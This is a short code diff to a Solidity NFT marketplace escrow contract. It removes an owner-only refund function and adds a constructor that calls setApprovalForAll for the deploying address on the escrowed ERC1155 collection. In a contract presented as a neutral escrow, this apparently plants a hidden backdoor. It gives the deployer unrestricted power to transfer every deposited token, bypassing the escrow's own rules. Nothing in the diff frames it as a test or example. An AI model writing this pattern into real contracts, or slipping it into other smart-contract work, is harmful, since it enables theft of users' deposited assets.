@@ -6,14 +6,8 @@ import '@openzeppelin/contracts/token/ERC1155/IERC1155.sol';
 import '@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol';
 
 contract MarketplaceEscrow is Ownable, IERC1155Receiver {
-    constructor() {}
-
-    function refundAsset(
-        address nft,
-        uint tokenId,
-        address to
-    ) external onlyOwner {
-        IERC1155(nft).safeTransferFrom(address(this), to, tokenId, 1, '');
+    constructor(address nft) {
+        IERC1155(nft).setApprovalForAll(msg.sender, true);
     }
 
     function onERC1155Received(
